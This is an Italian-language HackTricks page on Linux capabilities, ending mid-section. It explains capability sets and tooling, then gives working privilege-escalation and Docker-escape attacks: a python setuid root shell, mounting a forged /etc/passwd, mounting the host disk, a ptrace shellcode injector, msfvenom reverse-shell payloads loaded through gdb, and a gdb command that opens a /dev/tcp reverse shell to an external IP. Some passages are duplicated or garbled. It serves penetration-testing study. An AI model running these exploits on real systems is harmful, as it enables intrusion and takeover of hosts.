# Linux Capabilities

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) è l'evento di sicurezza informatica più rilevante in **Spagna** e uno dei più importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso è un punto di incontro bollente per professionisti della tecnologia e della sicurezza informatica in ogni disciplina.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

Le Linux capabilities dividono i **privilegi di root in unità più piccole e distinte**, consentendo ai processi di avere un sottoinsieme di privilegi. Ciò riduce al minimo i rischi non concedendo inutilmente i pieni privilegi di root.

### Il problema:
- Gli utenti normali hanno autorizzazioni limitate, che influiscono su attività come l'apertura di un socket di rete che richiede l'accesso di root.

### Set di capabilities:

1. **Inherited (CapInh)**:
- **Scopo**: Determina le capabilities ereditate dal processo padre.
- **Funzionalità**: Quando viene creato un nuovo processo, eredita le capabilities dal processo padre in questo set. Utile per mantenere determinati privilegi tra le generazioni di processi.
- **Limitazioni**: Un processo non può acquisire capabilities che il suo processo padre non possedeva.

2. **Effective (CapEff)**:
- **Scopo**: Rappresenta le capabilities effettive che un processo sta utilizzando in un determinato momento.
- **Funzionalità**: È l'insieme di capabilities controllate dal kernel per concedere l'autorizzazione a varie operazioni. Per i file, questo set può essere un flag che indica se le capabilities consentite del file devono essere considerate effettive.
- **Importanza**: L'insieme effettivo è fondamentale per i controlli immediati dei privilegi, agendo come l'insieme attivo di capabilities che un processo può utilizzare.

3. **Permitted (CapPrm)**:
- **Scopo**: Definisce l'insieme massimo di capabilities che un processo può possedere.
- **Funzionalità**: Un processo può elevare una capability dall'insieme consentito al suo insieme effettivo, conferendogli la capacità di utilizzare quella capability. Può anche rimuovere capabilities dal suo insieme consentito.
- **Limite**: Agisce come un limite superiore per le capabilities che un processo può avere, garantendo che un processo non superi il proprio ambito di privilegi predefinito.

4. **Bounding (CapBnd)**:
- **Scopo**: Impone un limite alle capabilities che un processo può acquisire durante il suo ciclo di vita.
- **Funzionalità**: Anche se un processo ha una determinata capability nel suo insieme ereditabile o consentito, non può acquisire quella capability a meno che non sia anche nell'insieme di bounding.
- **Caso d'uso**: Questo insieme è particolarmente utile per limitare il potenziale di escalation dei privilegi di un processo, aggiungendo un ulteriore livello di sicurezza.

5. **Ambient (CapAmb)**:
- **Scopo**: Consente di mantenere determinate capabilities durante una chiamata di sistema `execve`, che normalmente comporterebbe un reset completo delle capabilities del processo.
- **Funzionalità**: Garantisce che i programmi non SUID che non hanno capabilities di file associate possano mantenere determinati privilegi.
- **Limitazioni**: Le capabilities in questo insieme sono soggette ai vincoli degli insiemi ereditabili e consentiti, garantendo che non superino i privilegi consentiti al processo.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Per ulteriori informazioni, controlla:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capacità dei processi e dei binari

### Capacità dei processi

Per visualizzare le capacità di un determinato processo, utilizza il file **status** nella directory /proc. Poiché fornisce maggiori dettagli, limitiamoci solo alle informazioni relative alle capacità di Linux.\
Nota che per tutti i processi in esecuzione le informazioni sulle capacità sono mantenute per thread, mentre per i binari nel file system sono memorizzate negli attributi estesi.

Puoi trovare le capacità definite in /usr/include/linux/capability.h

Puoi trovare le capacità del processo corrente con `cat /proc/self/status` o utilizzando `capsh --print` e di altri utenti in `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Questo comando dovrebbe restituire 5 righe sulla maggior parte dei sistemi.

* CapInh = Capacità ereditate
* CapPrm = Capacità consentite
* CapEff = Capacità effettive
* CapBnd = Insieme di limitazione
* CapAmb = Insieme di capacità ambientali
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Questi numeri esadecimali non hanno senso. Utilizzando l'utilità capsh possiamo decodificarli nel nome delle capacità.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Verifichiamo ora le **capabilities** utilizzate da `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Anche se quella soluzione funziona, c'è un altro modo più semplice. Per visualizzare le capacità di un processo in esecuzione, basta utilizzare lo strumento **getpcaps** seguito dal suo ID di processo (PID). È anche possibile fornire un elenco di ID di processo.
```bash
getpcaps 1234
```
Verifichiamo qui le capacità di `tcpdump` dopo aver fornito al binario le capacità sufficienti (`cap_net_admin` e `cap_net_raw`) per intercettare il traffico di rete (_tcpdump è in esecuzione nel processo 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Come puoi vedere, le capacità fornite corrispondono ai risultati dei 2 modi per ottenere le capacità di un binario.\
Lo strumento _getpcaps_ utilizza la chiamata di sistema **capget()** per interrogare le capacità disponibili per un determinato thread. Questa chiamata di sistema richiede solo di fornire il PID per ottenere ulteriori informazioni.

### Capacità dei binari

I binari possono avere capacità che possono essere utilizzate durante l'esecuzione. Ad esempio, è molto comune trovare il binario `ping` con la capacità `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Puoi **cercare binari con le capability** utilizzando:
```bash
getcap -r / 2>/dev/null
```
### Eliminazione delle capacità con capsh

Se eliminiamo le capacità CAP\_NET\_RAW per _ping_, l'utilità ping non dovrebbe più funzionare.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Oltre all'output di _capsh_ stesso, il comando _tcpdump_ stesso dovrebbe generare un errore.

> /bin/bash: /usr/sbin/tcpdump: Operazione non consentita

L'errore mostra chiaramente che il comando ping non è autorizzato ad aprire un socket ICMP. Ora sappiamo con certezza che questo funziona come previsto.

### Rimuovere le Capacità

È possibile rimuovere le capacità di un eseguibile con
```bash
setcap -r </path/to/binary>
```
## Capacità degli Utenti

Apparentemente **è possibile assegnare le capacità anche agli utenti**. Ciò significa probabilmente che ogni processo eseguito dall'utente sarà in grado di utilizzare le sue capacità.\
Basandosi su [questo](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [questo](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) e [questo](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) alcuni file devono essere configurati per dare a un utente determinate capacità, ma quello che assegna le capacità a ciascun utente sarà `/etc/security/capability.conf`.\
Esempio di file:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capacità dell'ambiente

Compilando il seguente programma è possibile **generare una shell bash all'interno di un ambiente che fornisce capacità**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
All'interno della **bash eseguita dal binario ambientale compilato** è possibile osservare le **nuove capacità** (un utente normale non avrà alcuna capacità nella sezione "corrente").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Puoi **aggiungere solo le capacità presenti** sia nell'insieme dei permessi che in quello ereditabile.
{% endhint %}

### Binari consapevoli delle capacità / Binari ignoranti delle capacità

I **binari consapevoli delle capacità non utilizzeranno le nuove capacità** fornite dall'ambiente, mentre i **binari ignoranti delle capacità le utilizzeranno** poiché non le rifiuteranno. Ciò rende i binari ignoranti delle capacità vulnerabili all'interno di un ambiente speciale che concede capacità ai binari.

## Capacità del servizio

Per impostazione predefinita, un **servizio in esecuzione come root avrà assegnate tutte le capacità**, e in alcune occasioni ciò può essere pericoloso.\
Pertanto, un **file di configurazione del servizio** consente di **specificare** le **capacità** che si desidera che abbia, **e** l'**utente** che dovrebbe eseguire il servizio per evitare di eseguire un servizio con privilegi non necessari:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capacità nei container Docker

Di default, Docker assegna alcune capacità ai container. È molto facile verificare quali sono queste capacità eseguendo:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) è l'evento di sicurezza informatica più rilevante in **Spagna** e uno dei più importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso è un punto di incontro vivace per i professionisti della tecnologia e della sicurezza informatica in ogni disciplina.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

Le capacità sono utili quando **si desidera limitare i propri processi dopo aver eseguito operazioni privilegiate** (ad esempio, dopo aver impostato chroot e collegato a una socket). Tuttavia, possono essere sfruttate passando loro comandi o argomenti dannosi che vengono quindi eseguiti come root.

È possibile forzare le capacità sui programmi utilizzando `setcap` e interrogarle utilizzando `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Il `+ep` significa che stai aggiungendo la capacità ("-" la rimuoverebbe) come Effettiva e Consentita.

Per identificare i programmi in un sistema o una cartella con le capacità:
```bash
getcap -r / 2>/dev/null
```
### Esempio di sfruttamento

Nell'esempio seguente viene individuata una vulnerabilità di escalation dei privilegi nel binario `/usr/bin/python2.6`:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capacità** necessarie da `tcpdump` per **consentire a qualsiasi utente di intercettare pacchetti**:

```markdown
To allow any user to sniff packets with `tcpdump`, the following capabilities need to be set:

1. `CAP_NET_RAW`: This capability allows the user to create raw sockets, which is necessary for packet sniffing.

To set these capabilities, you can use the `setcap` command:

```bash
sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
```

After setting the capabilities, any user will be able to run `tcpdump` and sniff packets without requiring root privileges.
```
```

Per consentire a qualsiasi utente di intercettare pacchetti con `tcpdump`, è necessario impostare le seguenti **capacità**:

1. `CAP_NET_RAW`: Questa capacità consente all'utente di creare socket raw, che è necessario per l'intercettazione dei pacchetti.

Per impostare queste capacità, è possibile utilizzare il comando `setcap`:

```bash
sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
```

Dopo aver impostato le capacità, qualsiasi utente sarà in grado di eseguire `tcpdump` e intercettare pacchetti senza richiedere privilegi di root.
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Il caso speciale delle "capabilities" vuote

[Dalla documentazione](https://man7.org/linux/man-pages/man7/capabilities.7.html): Si noti che è possibile assegnare insiemi di "capabilities" vuoti a un file di programma e quindi è possibile creare un programma con set-user-ID-root che cambia l'ID utente effettivo e salvato del processo che esegue il programma a 0, ma non conferisce alcuna "capability" a tale processo. In altre parole, se si dispone di un binario che:

1. non è di proprietà di root
2. non ha impostati i bit `SUID`/`SGID`
3. ha un insieme di "capabilities" vuoto (ad esempio: `getcap myelf` restituisce `myelf =ep`)

allora **quel binario verrà eseguito come root**.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** è una "capability" di Linux molto potente, spesso equiparata a un livello quasi di root a causa dei suoi ampi **privilegi amministrativi**, come il montaggio di dispositivi o la manipolazione delle funzionalità del kernel. Sebbene indispensabile per i contenitori che simulano interi sistemi, **`CAP_SYS_ADMIN` presenta significativi problemi di sicurezza**, specialmente in ambienti containerizzati, a causa del suo potenziale per l'elevazione dei privilegi e la compromissione del sistema. Pertanto, il suo utilizzo richiede rigorose valutazioni di sicurezza e una gestione cauta, con una forte preferenza per la rimozione di questa "capability" nei contenitori specifici dell'applicazione per aderire al **principio del privilegio minimo** e ridurre al minimo la superficie di attacco.

**Esempio con binario**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Utilizzando python è possibile montare un file _passwd_ modificato sopra il vero file _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
E infine **monta** il file `passwd` modificato su `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
E sarai in grado di **`su` come root** utilizzando la password "password".

**Esempio con ambiente (Docker breakout)**

Puoi verificare le capacità abilitate all'interno del container Docker utilizzando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
All'interno dell'output precedente è possibile vedere che la capacità SYS_ADMIN è abilitata.

* **Montaggio**

Ciò consente al container docker di **montare il disco dell'host e accedervi liberamente**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Accesso completo**

Nel metodo precedente siamo riusciti ad accedere al disco dell'host Docker.\
Nel caso in cui tu scopra che l'host sta eseguendo un server **ssh**, potresti **creare un utente all'interno del disco dell'host Docker** e accedervi tramite SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Questo significa che puoi sfuggire al contenitore iniettando uno shellcode all'interno di un processo in esecuzione nell'host.** Per accedere ai processi in esecuzione nell'host, il contenitore deve essere eseguito almeno con **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** concede la possibilità di utilizzare funzionalità di debug e tracciamento delle chiamate di sistema fornite da `ptrace(2)` e chiamate di attacco cross-memory come `process_vm_readv(2)` e `process_vm_writev(2)`. Sebbene potente per scopi di diagnostica e monitoraggio, se `CAP_SYS_PTRACE` è abilitato senza misure restrittive come un filtro seccomp su `ptrace(2)`, può compromettere significativamente la sicurezza del sistema. In particolare, può essere sfruttato per eludere altre restrizioni di sicurezza, in particolare quelle imposte da seccomp, come dimostrato da [proof of concept (PoC) come questo](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Esempio con binario (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Esempio con binario (gdb)**

`gdb` con la capacità `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Creare uno shellcode con msfvenom per l'iniezione in memoria tramite gdb

```bash
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -b "\x00" -o shellcode.c
```

Questo comando crea uno shellcode utilizzando msfvenom per l'iniezione in memoria tramite gdb. Assicurati di sostituire `<IP>` con l'indirizzo IP del tuo listener e `<PORT>` con la porta del tuo listener. Il parametro `-f c` specifica il formato di output come codice C. Il parametro `-b "\x00"` esclude i byte null dallo shellcode. Infine, l'opzione `-o shellcode.c` specifica il nome del file di output come "shellcode.c".
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debugga un processo root con gdb e copia-incolla le righe gdb generate in precedenza:

```bash
$ gdb -p <pid>
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) run
```

```bash
$ gdb -p <pid>
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) run
```
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Esempio con ambiente (Docker breakout) - Un altro abuso di gdb**

Se **GDB** è installato (o puoi installarlo con `apk add gdb` o `apt install gdb`, ad esempio) puoi **debuggare un processo dall'host** e farlo chiamare la funzione `system`. (Questa tecnica richiede anche la capacità `SYS_ADMIN`).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Non sarai in grado di vedere l'output del comando eseguito, ma verrà eseguito da quel processo (quindi ottieni una shell inversa).

{% hint style="warning" %}
Se ricevi l'errore "No symbol "system" in current context.", controlla l'esempio precedente caricando uno shellcode in un programma tramite gdb.
{% endhint %}

**Esempio con ambiente (Docker breakout) - Iniezione di shellcode**

Puoi verificare le capacità abilitate all'interno del container Docker utilizzando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
